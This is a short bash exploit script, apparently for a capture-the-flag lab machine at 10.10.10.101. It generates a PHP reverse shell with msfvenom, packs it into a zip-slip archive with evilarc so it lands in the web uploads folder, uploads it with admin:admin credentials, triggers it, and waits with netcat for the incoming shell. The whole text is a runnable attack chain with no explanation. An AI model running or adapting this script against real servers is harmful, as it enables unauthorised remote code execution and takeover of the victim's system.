#!/bin/bash

PORT=443

[ -f ./evilarc/evilarc.py ] && sleep 0 || git clone https://github.com/ptoomey3/evilarc -q

[ -f reverse.php ] && sleep 0 || msfvenom -p php/reverse_php lhost=tun0 lport=$PORT -o reverse.php

python evilarc/evilarc.py reverse.php -f reverse.zip -d 4 --os=unix -p /var/www/html/uploads > /dev/null

http --form POST "http://10.10.10.101:8080/upload" file@reverse.zip -a admin:admin > /dev/null

rm -rf evilarc/ reverse.*

http http://10.10.10.101/uploads/reverse.php > /dev/null &

nc -lvp $PORT
